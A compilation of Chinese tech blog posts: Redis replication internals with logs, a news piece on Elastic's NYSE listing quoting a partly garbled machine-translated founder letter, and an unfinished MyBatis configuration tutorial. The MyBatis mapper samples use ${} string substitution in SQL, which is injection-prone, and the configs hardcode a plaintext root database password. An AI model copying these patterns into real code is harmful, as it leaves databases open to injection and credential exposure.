# The backlog is only allocated once there is at least a slave connected.

只有slave连接上来，才会开辟backlog。
 
repl-backlog-ttl：如果master上的slave全都断开了，且在指定的时间内没有连接上，则backlog会被master清除掉。repl-backlog-ttl即用来设置该时长，默认为3600s，如果设置为0，则永不清除。
 
slave-priority：设置slave的优先级，用于Redis Sentinel主从切换时使用，值越小，则提升为主的优先级越高。需要注意的是，如果设置为0，则代表该slave不参加选主。
 
slave-announce-ip，slave-announce-port ：常用于端口转发或NAT场景下，对Master暴露真实IP和端口信息。
 
同步的过程
1. 从节点向主节点发送PSYNC命令。
2. 收到PSYNC命令的主节点执行BGSAVE命令，在后台生成一个RDB文件，并使用一个缓冲区记录从现在开始执行的所有写命令。
3. 当主节点的BGSAVE命令执行完毕时，主节点会将BGSAVE命令生成的RDB文件发送给从节点，从节点接受并载入这个RDB文件，将自己的数据库状态更新至主节点执行BGSAVE命令时的数据库状态。
4. 主节点将记录在缓冲区里面的所有写命令发送给从节点，从节点执行这些写命令，将自己的数据库状态更新至主节点数据库当前所处的状态。
 
需要注意的是，在步骤2中提到的缓冲区，其实是有大小限制的，其由client-output-buffer-limit slave 256mb 64mb 60决定，该参数的语法及解释如下：

# client-output-buffer-limit <class> <hard limit> <soft limit> <soft seconds>
#
# A client is immediately disconnected once the hard limit is reached, or if
# the soft limit is reached and remains reached for the specified number of
# seconds (continuously).

意思是如果该缓冲区的大小超过256M，或该缓冲区的大小超过64M，且持续了60s，主节点会马上断开从节点的连接。断开连接后，在60s之后（repl-timeout），从节点发现没有从主节点中获得数据，会重新启动复制。
 
在Redis 2.8之前，如果因网络原因，主从节点复制中断，当再次建立连接时，还是会执行SYNC命令进行全量复制。效率较为低下。从Redis 2.8开始，引入了PSYNC命令代替SYNC命令来执行复制时的同步操作。
PSYNC命令具有全量同步（full resynchronization）和增量同步（partial resynchronization）。
全量同步的日志：
master：

19544:M 05 Oct 20:44:04.713 * Slave 127.0.0.1:6380 asks for synchronization
19544:M 05 Oct 20:44:04.713 * Partial resynchronization not accepted: Replication ID mismatch (Slave asked for 'dc419fe03ddc9ba30cf2a2cf1894872513f1ef96', my 
replication IDs are 'f8a035fdbb7cfe435652b3445c2141f98a65e437' and '0000000000000000000000000000000000000000')19544:M 05 Oct 20:44:04.713 * Starting BGSAVE for SYNC with target: disk
19544:M 05 Oct 20:44:04.713 * Background saving started by pid 20585
20585:C 05 Oct 20:44:04.723 * DB saved on disk
20585:C 05 Oct 20:44:04.723 * RDB: 0 MB of memory used by copy-on-write
19544:M 05 Oct 20:44:04.813 * Background saving terminated with success
19544:M 05 Oct 20:44:04.814 * Synchronization with slave 127.0.0.1:6380 succeeded

slave：

19746:S 05 Oct 20:44:04.288 * Before turning into a slave, using my master parameters to synthesize a cached master: I may be able to synchronize with the new
 master with just a partial transfer.19746:S 05 Oct 20:44:04.288 * SLAVE OF 127.0.0.1:6379 enabled (user request from 'id=3 addr=127.0.0.1:37128 fd=8 name= age=929 idle=0 flags=N db=0 sub=0 psub=
0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=slaveof')19746:S 05 Oct 20:44:04.712 * Connecting to MASTER 127.0.0.1:6379
19746:S 05 Oct 20:44:04.712 * MASTER <-> SLAVE sync started
19746:S 05 Oct 20:44:04.712 * Non blocking connect for SYNC fired the event.
19746:S 05 Oct 20:44:04.713 * Master replied to PING, replication can continue...
19746:S 05 Oct 20:44:04.713 * Trying a partial resynchronization (request dc419fe03ddc9ba30cf2a2cf1894872513f1ef96:1191).
19746:S 05 Oct 20:44:04.713 * Full resync from master: f8a035fdbb7cfe435652b3445c2141f98a65e437:1190
19746:S 05 Oct 20:44:04.713 * Discarding previously cached master state.
19746:S 05 Oct 20:44:04.814 * MASTER <-> SLAVE sync: receiving 224566 bytes from master
19746:S 05 Oct 20:44:04.814 * MASTER <-> SLAVE sync: Flushing old data
19746:S 05 Oct 20:44:04.815 * MASTER <-> SLAVE sync: Loading DB in memory
19746:S 05 Oct 20:44:04.817 * MASTER <-> SLAVE sync: Finished with success

 
增量同步的日志：
master：

19544:M 05 Oct 20:42:06.423 # Connection with slave 127.0.0.1:6380 lost.
19544:M 05 Oct 20:42:06.753 * Slave 127.0.0.1:6380 asks for synchronization
19544:M 05 Oct 20:42:06.753 * Partial resynchronization request from 127.0.0.1:6380 accepted. Sending 0 bytes of backlog starting from offset 1037.

slave：

19746:S 05 Oct 20:42:06.423 # Connection with master lost.
19746:S 05 Oct 20:42:06.423 * Caching the disconnected master state.
19746:S 05 Oct 20:42:06.752 * Connecting to MASTER 127.0.0.1:6379
19746:S 05 Oct 20:42:06.752 * MASTER <-> SLAVE sync started
19746:S 05 Oct 20:42:06.752 * Non blocking connect for SYNC fired the event.
19746:S 05 Oct 20:42:06.753 * Master replied to PING, replication can continue...
19746:S 05 Oct 20:42:06.753 * Trying a partial resynchronization (request f8a035fdbb7cfe435652b3445c2141f98a65e437:1037).
19746:S 05 Oct 20:42:06.753 * Successful partial resynchronization with master.
19746:S 05 Oct 20:42:06.753 * MASTER <-> SLAVE sync: Master accepted a Partial Resynchronization.

 
在Redis 4.0中，master_replid和offset存储在RDB文件中。当从节点被优雅的关闭并重新启动时，Redis能够从RDB文件中重新加载master_replid和offset，从而使增量同步成为可能。
 
增量同步的实现依赖于以下三部分：
1. 主从节点的复制偏移量。
2. 主节点的复制积压缓冲区。
3. 节点的运行ID（run ID）。
 
当一个从节点被提升为主节点时，其它的从节点必须与新主节点重新同步。在Redis 4.0 之前，因为master_replid发生了变化，所以这个过程是一个全量同步。在Redis 4.0之后，新主节点会记录旧主节点的naster_replid和offset，因为能够接受来自其它从节点的增量同步请求，即使请求中的master_replid不同。在底层实现上，当执行slaveof no one时，会将master_replid，master_repl_offset+1复制为master_replid，second_repl_offset。
 
复制相关变量

# Replication
role:master
connected_slaves:2
slave0:ip=127.0.0.1,port=6380,state=online,offset=5698,lag=0
slave1:ip=127.0.0.1,port=6381,state=online,offset=5698,lag=0
master_replid:e071f49c8d9d6719d88c56fa632435fba83e145d
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:5698
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:5698

# Replication
role:slave
master_host:127.0.0.1
master_port:6379
master_link_status:up
master_last_io_seconds_ago:1
master_sync_in_progress:0
slave_repl_offset:126
slave_priority:100
slave_read_only:1
connected_slaves:0
master_replid:15715bc0bd37a71cae3d08b9566f001ccbc739de
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:126
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:126

 
其中，
role: Value is "master" if the instance is replica of no one, or "slave" if the instance is a replica of some master instance. Note that a replica can be master of another replica (chained replication).
master_replid: The replication ID of the Redis server. 每个Redis节点启动后都会动态分配一个40位的十六进制字符串作为运行ID。主的运行ID。
master_replid2: The secondary replication ID, used for PSYNC after a failover. 在执行slaveof no one时，会将master_replid，master_repl_offset+1复制为master_replid，second_repl_offset。
master_repl_offset: The server's current replication offset.  Master的复制偏移量。
second_repl_offset: The offset up to which replication IDs are accepted.
repl_backlog_active: Flag indicating replication backlog is active 是否开启了backlog。
repl_backlog_size: Total size in bytes of the replication backlog buffer. repl-backlog-size的大小。
repl_backlog_first_byte_offset: The master offset of the replication backlog buffer. backlog中保存的Master最早的偏移量，
repl_backlog_histlen: Size in bytes of the data in the replication backlog buffer. backlog中数据的大小。
If the instance is a replica, these additional fields are provided:
master_host: Host or IP address of the master. Master的IP。
master_port: Master listening TCP port. Master的端口。
master_link_status: Status of the link (up/down). 主从之间的连接状态。
master_last_io_seconds_ago: Number of seconds since the last interaction with master.  主节点每隔10s对从从节点发送PING命令，以判断从节点的存活性和连接状态。该变量代表多久之前，主从进行了心跳交互。
master_sync_in_progress: Indicate the master is syncing to the replica. 主节点是否在向从节点同步数据。个人觉得，应该指的是全量同步或增量同步。
slave_repl_offset: The replication offset of the replica instance. Slave的复制偏移量。
slave_priority: The priority of the instance as a candidate for failover. Slave的权重。
slave_read_only: Flag indicating if the replica is read-only. Slave是否处于可读模式。
If a SYNC operation is on-going, these additional fields are provided:
master_sync_left_bytes: Number of bytes left before syncing is complete. 
master_sync_last_io_seconds_ago: Number of seconds since last transfer I/O during a SYNC operation. 
If the link between master and replica is down, an additional field is provided:
master_link_down_since_seconds: Number of seconds since the link is down. 主从连接中断持续的时间。
 
The following field is always provided:
connected_slaves: Number of connected replicas. 连接的Slave的数量。
 
If the server is configured with the min-slaves-to-write (or starting with Redis 5 with the min-replicas-to-write) directive, an additional field is provided:
min_slaves_good_slaves: Number of replicas currently considered good。状态正常的从节点的数量。
 
For each replica, the following line is added:slaveXXX: id, IP address, port, state, offset, lag. Slave的状态。

slave0:ip=127.0.0.1,port=6381,state=online,offset=1288,lag=1

 
如何监控主从延迟

# Replication
role:master
connected_slaves:2
slave0:ip=127.0.0.1,port=6381,state=online,offset=560,lag=0
slave1:ip=127.0.0.1,port=6380,state=online,offset=560,lag=0
master_replid:15715bc0bd37a71cae3d08b9566f001ccbc739de
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:560

其中，master_repl_offset是主节点的复制偏移量，slaveX中的offset即对应从节点的复制偏移量，两者的差值即主从的延迟量。
 
如何评估backlog缓冲区的大小
t * (master_repl_offset2 - master_repl_offset1 ) / (t2 - t1)
t is how long the disconnections may last in seconds.
 
参考：
1. 《Redis开发与运维》
2. 《Redis设计与实现》
3. 《Redis 4.X Cookbook》
********************************************************************************************************************************************************************************************************
Elastic 今日在纽交所上市，股价最高暴涨122%。
10 月 6 日，Elastic 正式在纽约证券交易所上市，股票代码为"ESTC"。开盘之后股价直线拉升，最高点涨幅达122%，截止到收盘涨幅回落到94%，意味着上市第一天估值接近翻倍。

该公司最初位于阿姆斯特丹，而后搬迁到加利福尼亚，其股价定价为 33 至 35 美元，高于最初的每股 26 美元至 29 美元的价格指数。 700 万普通股募集资金约 1.92 亿美元，上市首日收盘价 70 美元。Elastic 公司拥有期权的程序员们估计今天又是一个不眠夜。
Elastic 成立于 2012 年，最著名的产品是搜索引擎 Elasticsearch ，该搜索引擎以与 Google LLC 索引互联网类似的方式为企业用户索引内部数据。使用该产品的知名公司包括：思科、eBay、高盛、美国国家宇航局、微软、维基媒体基金会、三星电子和韦里逊等，下载量超过 1 亿人次。
Elastic 是一家搜索公司。作为 Elastic Stack（Elasticsearch，Kibana，Beats和Logstash）的创建者，Elastic 构建了自我管理和 SaaS 产品，使数据可以实时和大规模地用于搜索、日志记录、安全和分析用例。该产品普遍应用在各大互联网行业，从最初的日志监控工具发展成为一个全方面的监控平台。
值得注意的是，Elastic 的核心产品是开源的。该公司通过商业版本赚钱，其中包括企业的高级功能，以及去年增加的机器学习功能，可以发现实时数据流中的异常情况。
作为公司最重量级的产品 Elasticsearch，它的诞生其实有着一段故事：

多年前，一个叫做 Shay Banon 的刚结婚不久的失业开发者，由于妻子要去伦敦学习厨师，他便跟着也去了。在他找工作的过程中，为了给妻子构建一个食谱的搜索引擎，他开始构建一个早期版本的 Lucene。
直接基于 Lucene 工作会比较困难，所以 Shay 开始抽象 Lucene 代码以便 Java 程序员可以在应用中添加搜索功能。他发布了他的第一个开源项目，叫做“ Compass”。
后来 Shay 找到一份工作，这份工作处在高性能和内存数据网格的分布式环境中，因此高性能的、实时的、分布式的搜索引擎也是理所当然需要的。然后他决定重写 Compass 库使其成为一个独立的服务叫做 Elasticsearch。
第一个公开版本出现在 2010 年 2 月，在那之后 Elasticsearch 已经成为 Github上最受欢迎的项目之一，代码贡献者超过300人。一家主营 Elasticsearch 的公司就此成立，他们一边提供商业支持一边开发新功能，不过 Elasticsearch 将永远开源且对所有人可用。
Shay 的妻子依旧等待着她的食谱搜索……

每次看到这个故事我都要笑一笑，那么 Elasticsearch 到底是什么呢？简单介绍一下：
Elasticsearch 是一个基于 Apache Lucene(TM) 的开源搜索引擎。无论在开源还是专有领域，Lucene 可以被认为是迄今为止最先进、性能最好的、功能最全的搜索引擎库。
但是，Lucene 只是一个库。想要使用它，你必须使用 Java 来作为开发语言并将其直接集成到你的应用中，更糟糕的是，Lucene 非常复杂，你需要深入了解检索的相关知识来理解它是如何工作的。
Elasticsearch 也使用 Java 开发并使用 Lucene 作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的 RESTful API 来隐藏 Lucene 的复杂性，从而让全文搜索变得简单。
不过，Elasticsearch 不仅仅是 Lucene 和全文搜索，我们还能这样去描述它：

分布式的实时文件存储，每个字段都被索引并可被搜索
分布式的实时分析搜索引擎
可以扩展到上百台服务器，处理PB级结构化或非结构化数据

而且，所有的这些功能被集成到一个服务里面，你的应用可以通过简单的 RESTful API、各种语言的客户端甚至命令行与之交互。
上手 Elasticsearch 非常容易，它提供了许多合理的缺省值，并对初学者隐藏了复杂的搜索引擎理论。它开箱即用（安装即可使用），只需很少的学习既可在生产环境中使用。
用一句话来总结就是：Elasticsearch 是一个实时分布式搜索和分析引擎，可以应用在任何实时检索的场景中。
Elastic 上市对程序员意味着什么？
对照上面的故事我们发现，Elasticsearch 最早只是一个解决垂直领域的一个小工具，随着时间的推移这个小工具慢慢的发展成为一个开源项目；当这个开源项目使用越来越广的时候，创建者将其发展成为一个产品；依赖于此产品成为了一个公司，随着公司的不断发展依赖此产品不断扩充它的产品线和应用场景，同时推出商业版本的解决方案；最后公司不断发展、融资、壮大，直到现在公司上市。
公司成长路线图：

小工具 > 开源项目 > 成熟产品 > 成立公司 > 商业版本 > 产品线扩充 > 融资发展 > 公司上市

可以说上面的成长路线是每一个程序员都所期望的逆袭经历，真正的通过某一个技术不断的发展、成熟、成立公司、最后上市，其产品影响千万个企业，用技术造福了整个行业，并且自己也成功逆袭走上人生巅峰。
Elastic 公司上市给很多自由职业或者追求技术创业的朋友一个大大的鼓舞。中国已经有很多类似的初创企业，比如开源产品 TiDB 的公司 PingCAP 已经获得多轮投资，公司发展非常迅速。所以说：技术创业可行，并且前景广阔。

最后附 Elastic search 官网回顾自己的过往并展望未来：

你们好,
今天我们将以一家上市公司的名义踏上旅程。 我很自豪地宣布，Elastic search 在纽约证券交易所上市，股票代码为“ESTC。”
2010年2月8日，当我第一次发布 Elasticsearch 的时候，我有一个看法，搜索不仅仅是一个搜索框在一个网站上。那时，公司开始存储更多的数据，包括结构化的和非结构化的，以及来自许多不同数据源的数据，例如数据库、网站、应用程序以及移动和连接设备。在我看来，搜索将为用户提供一种与他们的数据交互的新类型，包括，速度，实时获得结果的能力；规模，以毫秒查询千兆字节数据的能力；相关性，获得准确和可操作的信息、见解和 answe 的能力。来自数据的 RS。
我为我这六年来在 Elasticsearch 的营造而感到自豪。 有超过3.5亿的产品下载，一个聚会的100000多名开发人员社区，和超过5500名客户，看到搜索如何应用于这样的各种各样的用例，真是让人不寒而栗。例如，当您使用 Uber、Instacart 和 Tinder 时，它是弹性的，它使骑手与附近的司机配对，为在线购物者提供相关的结果和建议，或者匹配他们可能喜欢的人——以及谁可能喜欢他们回来。另一方面，在传统的IT、运营和安全部门中，像思科、斯普林特和印第安纳大学这样的组织，使用Elastic来聚合定价、报价和商业数据，每天处理数十亿日志事件，以监控网站性能和网络中断，并为数千个设备和关键数据提供网络安全操作。虽然这些用例中的每一个都不同，但都是搜索。
作为一家上市公司，我们将继续做那些使我们富有弹性的事情。我们将继续在全世界的开发者社区投资，这是我们的DNA。我们将继续为Elastic Stack 建立新的特征和解决方案。我们将始终允许用户和他们的组织部署我们的产品，无论它最适合他们的地方——现场、公共云或使用我们的弹性云。最后，我们将永远遵守我们的源代码，雇佣谦虚、积极、平衡的优秀人员来帮助我们的用户、客户和合作伙伴获得成功。
谢谢每一个让今天成为可能的人。
谢

参考
Elasticsearch权威指南

********************************************************************************************************************************************************************************************************
MyBatis学习总结（二）——MyBatis核心配置文件与输入输出映射
在上一章中我们学习了《MyBatis学习总结（一）——ORM概要与MyBatis快速起步》，这一章主要是介绍MyBatis核心配置文件、使用接口+XML实现完整数据访问、输入参数映射与输出结果映射等内容。
一、MyBatis配置文件概要
MyBatis核心配置文件在初始化时会被引用，在配置文件中定义了一些参数，当然可以完全不需要配置文件，全部通过编码实现，该配置文件主要是是起到解偶的作用。如第一讲中我们用到conf.xml文件：

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE configuration
        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<configuration>
    <environments default="development">
        <environment id="development">
            <transactionManager type="JDBC"/>
            <dataSource type="POOLED">
                <property name="driver" value="com.mysql.jdbc.Driver"/>
                <property name="url" value="jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&amp;characterEncoding=UTF-8"/>
                <property name="username" value="root"/>
                <property name="password" value="uchr@123"/>
            </dataSource>
        </environment>
    </environments>
    <mappers>
        <!--<mapper resource="mapper/studentMapper.xml"/>-->
        <mapper class="com.zhangguo.mybatis02.dao.StudentMapper"></mapper>
    </mappers>
</configuration>

MyBatis 的配置文件包含了会深深影响 MyBatis 行为的设置（settings）和属性（properties）信息。文档的顶层结构如下：：

configuration 配置

properties 属性
settings 设置
typeAliases 类型别名
typeHandlers 类型处理器
objectFactory 对象工厂
plugins 插件
environments 环境

environment 环境变量

transactionManager 事务管理器
dataSource 数据源




databaseIdProvider 数据库厂商标识
mappers 映射器



二、MyBatis配置文件详解
该配置文件的官方详细描述可以点击这里打开。
2.1、properties属性
作用：将数据连接单独配置在db.properties中，只需要在myBatisConfig.xml中加载db.properties的属性值，在myBatisConfig.xml中就不需要对数据库连接参数进行硬编码。数据库连接参数只配置在db.properties中，方便对参数进行统一管理，其它xml可以引用该db.properties。
db.properties的内容：

##MySQL连接字符串
#驱动
mysql.driver=com.mysql.jdbc.Driver
#地址
mysql.url=jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&amp;characterEncoding=UTF-8
#用户名
mysql.username=root
#密码
mysql.password=uchr@123

在myBatisConfig.xml中加载db.properties

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE configuration
        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<configuration>
    <!--导入db.properties文件中的所有key-value数据-->
    <properties resource="db.properties">
        <!--定义一个名称为driver，值为com.mysql.jdbc.Driver的属性-->
        <property name="driver" value="com.mysql.jdbc.Driver"></property>
    </properties>
    <!--环境配置，default为默认选择的环境-->
    <environments default="work">
        <!--开发-->
        <environment id="development">
            <!--事务管理-->
            <transactionManager type="JDBC"/>
            <!--连接池-->
            <dataSource type="POOLED">
                <!--引用属性${mysql.driver}-->
                <property name="driver" value="${mysql.driver}"/>
                <property name="url" value="${mysql.url}"/>
                <property name="username" value="${mysql.username}"/>
                <property name="password" value="${mysql.password}"/>
            </dataSource>
        </environment>
        <!--运行-->
        <environment id="work">
            <transactionManager type="JDBC"/>
            <dataSource type="POOLED">
                <property name="driver" value="${driver}"/>
                <property name="url" value="jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&amp;characterEncoding=UTF-8"/>
                <property name="username" value="root"/>
                <property name="password" value="uchr@123"/>
            </dataSource>
        </environment>
    </environments>
    <mappers>
        <!--<mapper resource="mapper/studentMapper.xml"/>-->
        <mapper class="com.zhangguo.mybatis02.dao.StudentMapper"></mapper>
    </mappers>
</configuration>

properties特性：
注意：

在properties元素体内定义的属性优先读取。
然后读取properties元素中resource或url加载的属性，它会覆盖已读取的同名属性。
最后读取parameterType传递的属性，它会覆盖已读取的同名属性

建议：
　　不要在properties元素体内添加任何属性值，只将属性值定义在properties文件中。
　　在properties文件中定义属性名要有一定的特殊性，如xxxx.xxxx(jdbc.driver)
2.2、settings全局参数配置
mybatis框架运行时可以调整一些运行参数。比如，开启二级缓存，开启延迟加载等等。全局参数会影响mybatis的运行行为。
mybatis-settings的配置属性以及描述



setting(设置)
Description(描述)
valid　Values(验证值组)
Default(默认值)


cacheEnabled
在全局范围内启用或禁用缓存配置 任何映射器在此配置下。
true | false
TRUE


lazyLoadingEnabled
在全局范围内启用或禁用延迟加载。禁用时，所有相关联的将热加载。
true | false
TRUE


aggressiveLazyLoading
启用时，有延迟加载属性的对象将被完全加载后调用懒惰的任何属性。否则，每一个属性是按需加载。
true | false
TRUE


multipleResultSetsEnabled
允许或不允许从一个单独的语句（需要兼容的驱动程序）要返回多个结果集。
true | false
TRUE


useColumnLabel
使用列标签，而不是列名。在这方面，不同的驱动有不同的行为。参考驱动文档或测试两种方法来决定你的驱动程序的行为如何。
true | false
TRUE


useGeneratedKeys
允许JDBC支持生成的密钥。兼容的驱动程序是必需的。此设置强制生成的键被使用，如果设置为true，一些驱动会不兼容性，但仍然可以工作。
true | false
FALSE


autoMappingBehavior
指定MyBatis的应如何自动映射列到字段/属性。NONE自动映射。 PARTIAL只会自动映射结果没有嵌套结果映射定义里面。 FULL会自动映射的结果映射任何复杂的（包含嵌套或其他）。

NONE,PARTIAL,FULL

PARTIAL


defaultExecutorType
配置默认执行人。SIMPLE执行人确实没有什么特别的。 REUSE执行器重用准备好的语句。 BATCH执行器重用语句和批处理更新。

SIMPLE,REUSE,BATCH

SIMPLE


safeRowBoundsEnabled
允许使用嵌套的语句RowBounds。
true | false
FALSE


mapUnderscoreToCamelCase
从经典的数据库列名A_COLUMN启用自动映射到骆驼标识的经典的Java属性名aColumn。
true | false
FALSE


localCacheScope
MyBatis的使用本地缓存，以防止循环引用，并加快反复嵌套查询。默认情况下（SESSION）会话期间执行的所有查询缓存。如果localCacheScope=STATMENT本地会话将被用于语句的执行，只是没有将数据共享之间的两个不同的调用相同的SqlSession。

SESSION
STATEMENT

SESSION


dbcTypeForNull
指定为空值时，没有特定的JDBC类型的参数的JDBC类型。有些驱动需要指定列的JDBC类型，但其他像NULL，VARCHAR或OTHER的工作与通用值。
JdbcType enumeration. Most common are: NULL, VARCHAR and OTHER
OTHER


lazyLoadTriggerMethods
指定触发延迟加载的对象的方法。
A method name list separated by commas
equals,clone,hashCode,toString


defaultScriptingLanguage
指定所使用的语言默认为动态SQL生成。
A type alias or fully qualified class name.

org.apache.ibatis.scripting.xmltags
.XMLDynamicLanguageDriver



callSettersOnNulls
指定如果setter方法或map的put方法时，将调用检索到的值是null。它是有用的，当你依靠Map.keySet（）或null初始化。注意（如整型，布尔等）不会被设置为null。
true | false
FALSE


logPrefix
指定的前缀字串，MyBatis将会增加记录器的名称。
Any String
Not set


logImpl
指定MyBatis的日志实现使用。如果此设置是不存在的记录的实施将自动查找。
SLF4J | LOG4J | LOG4J2 | JDK_LOGGING | COMMONS_LOGGING | STDOUT_LOGGING | NO_LOGGING
Not set


proxyFactory
指定代理工具，MyBatis将会使用创建懒加载能力的对象。
CGLIB | JAVASSIST
 CGLIB



官方文档settings的例子：


<setting name="cacheEnabled" value="true"/>
    <setting name="lazyLoadingEnabled" value="true"/>
    <setting name="multipleResultSetsEnabled" value="true"/>
    <setting name="useColumnLabel" value="true"/>
    <setting name="useGeneratedKeys" value="false"/>
    <setting name="autoMappingBehavior" value="PARTIAL"/>
    <setting name="defaultExecutorType" value="SIMPLE"/>
    <setting name="defaultStatementTimeout" value="25"/>
    <setting name="safeRowBoundsEnabled" value="false"/>
    <setting name="mapUnderscoreToCamelCase" value="false"/>
    <setting name="localCacheScope" value="SESSION"/>
    <setting name="jdbcTypeForNull" value="OTHER"/>
    <setting name="lazyLoadTriggerMethods" value="equals,clone,hashCode,toString"/>
</settings>

View Code
示例：
这里设置MyBatis的日志输出到控制台：

    <!--外部引入的内容将覆盖内部定义的-->
    <properties resource="db.properties">
        <!--定义一个名称为driver，值为com.mysql.jdbc.Driver的属性-->
        <property name="mysql.driver" value="com.mysql.jdbc.Driver"></property>
    </properties>
    
    <settings>
        <!--设置是否允许缓存-->
        <setting name="cacheEnabled" value="true"/>
        <!--设置日志输出的目标-->
        <setting name="logImpl" value="STDOUT_LOGGING"/>
    </settings>

结果：

2.3、typeAiases(别名)
在mapper.xml中，定义很多的statement，statement需要parameterType指定输入参数的类型、需要resultType指定输出结果的映射类型。
如果在指定类型时输入类型全路径，不方便进行开发，可以针对parameterType或resultType指定的类型定义一些别名，在mapper.xml中通过别名定义，方便开发。
如下所示类型com.zhangguo.mybatis02.entities.Student会反复出现，冗余：
 

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.zhangguo.mybatis02.mapper.studentMapper">
    <select id="selectStudentById" resultType="com.zhangguo.mybatis02.entities.Student">
        SELECT id,name,sex from student where id=#{id}
    </select>

    <select id="selectStudentsByName" parameterType="String" resultType="com.zhangguo.mybatis02.entities.Student">
      SELECT id,name,sex from student where name like '%${value}%';
    </select>

    <insert id="insertStudent" parameterType="com.zhangguo.mybatis02.entities.Student">
        insert into student(name,sex) VALUES(#{name},'${sex}')
    </insert>

    <update id="updateStudent" parameterType="com.zhangguo.mybatis02.entities.Student">
        update student set name=#{name},sex=#{sex} where id=#{id}
    </update>

    <delete id="deleteStudent" parameterType="int">
        delete from student where id=#{id}
    </delete>

</mapper>

2.3.1.MyBatis默认支持的别名




别名


映射的类型




_byte 


byte 




_long 


long 




_short 


short 




_int 


int 




_integer 


int 




_double 


double 




_float 


float 




_boolean 


boolean 




string 


String 




byte 


Byte 




long 


Long 




short 


Short 




int 


Integer 




integer 


Integer 




double 


Double 




float 


Float 




boolean 


Boolean 




date 


Date 




decimal 


BigDecimal 




bigdecimal 


BigDecimal 




2.3.2.自定义别名
（一）、单个别名定义(在myBatisConfig.xml)　　

    <settings>
        <!--设置是否允许缓存-->
        <setting name="cacheEnabled" value="true"/>
        <!--设置日志输出的目标-->
        <setting name="logImpl" value="STDOUT_LOGGING"/>
    </settings>

    <!--别名-->
    <typeAliases>
        <!--定义单个别名，指定名称为student，对应的类型为com.zhangguo.mybatis02.entities.Student-->
        <typeAlias type="com.zhangguo.mybatis02.entities.Student" alias="student"></typeAlias>
    </typeAliases>

UserMapper.xml引用别名

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.zhangguo.mybatis02.mapper.studentMapper">
    <select id="selectStudentById" resultType="student">
        SELECT id,name,sex from student where id=#{id}
    </select>

    <select id="selectStudentsByName" parameterType="String" resultType="student">
      SELECT id,name,sex from student where name like '%${value}%';
    </select>

    <insert id="insertStudent" parameterType="student">
        insert into student(name,sex) VALUES(#{name},'${sex}')
    </insert>

    <update id="updateStudent" parameterType="student">
        update student set name=#{name},sex=#{sex} where id=#{id}
    </update>

    <delete id="deleteStudent" parameterType="int">
        delete from student where id=#{id}
    </delete>

</mapper>

（二）批量定义别名，扫描指定的包
定义单个别名的缺点很明显，如果项目中有很多别名则需要一个一个定义，且修改类型了还要修改配置文件非常麻烦，可以指定一个包，将下面所有的类都按照一定的规则定义成别名：
 

    <settings>
        <!--设置是否允许缓存-->
        <setting name="cacheEnabled" value="true"/>
        <!--设置日志输出的目标-->
        <setting name="logImpl" value="STDOUT_LOGGING"/>
    </settings>

    <!--别名-->
    <typeAliases>
        <!--定义单个别名，指定名称为student，对应的类型为com.zhangguo.mybatis02.entities.Student-->
        <!--<typeAlias type="com.zhangguo.mybatis02.entities.Student" alias="student"></typeAlias>-->
        <!--指定包名下所有的类被自动扫描并定义默认别名，
        mybatis会自动扫描包中的pojo类，自动定义别名，别名就是类名(首字母大写或小写都可以)-->
        <package name="com.zhangguo.mybatis02.entities"></package>
    </typeAliases>

 如果com.zhangguo.mybatis02.entities包下有一个名为Student的类，则使用别名时可以是：student，或Student。
你一定会想到当两个名称相同时的冲突问题，可以使用注解解决

解决方法：

2.4、typeHandlers(类型处理器)
mybatis中通过typeHandlers完成jdbc类型和java类型的转换。
通常情况下，mybatis提供的类型处理器满足日常需要，不需要自定义.
mybatis支持类型处理器：




类型处理器


Java类型


JDBC类型




BooleanTypeHandler 


Boolean，boolean 


任何兼容的布尔值




ByteTypeHandler 


Byte，byte 


任何兼容的数字或字节类型




ShortTypeHandler 


Short，short 


任何兼容的数字或短整型




IntegerTypeHandler 


Integer，int 


任何兼容的数字和整型




LongTypeHandler 


Long，long 


任何兼容的数字或长整型




FloatTypeHandler 


Float，float 


任何兼容的数字或单精度浮点型




DoubleTypeHandler 


Double，double 


任何兼容的数字或双精度浮点型




BigDecimalTypeHandler 


BigDecimal 


任何兼容的数字或十进制小数类型




StringTypeHandler 


String 


CHAR和VARCHAR类型




ClobTypeHandler 


String 


CLOB和LONGVARCHAR类型




NStringTypeHandler 


String 


NVARCHAR和NCHAR类型




NClobTypeHandler 


String 


NCLOB类型




ByteArrayTypeHandler 


byte[] 


任何兼容的字节流类型




BlobTypeHandler 


byte[] 


BLOB和LONGVARBINARY类型




DateTypeHandler 


Date（java.util）


TIMESTAMP类型




DateOnlyTypeHandler 


Date（java.util）


DATE类型




TimeOnlyTypeHandler 


Date（java.util）


TIME类型




SqlTimestampTypeHandler 


Timestamp（java.sql）


TIMESTAMP类型




SqlDateTypeHandler 


Date（java.sql）


DATE类型




SqlTimeTypeHandler 


Time（java.sql）


TIME类型




ObjectTypeHandler 


任意


其他或未指定类型




EnumTypeHandler 


Enumeration类型


VARCHAR-任何兼容的字符串类型，作为代码存储（而不是索引）。





2.5、mappers(映射配置)
映射配置可以有多种方式，如下XML配置所示：

<!-- 将sql映射注册到全局配置中-->
    <mappers>

        <!--
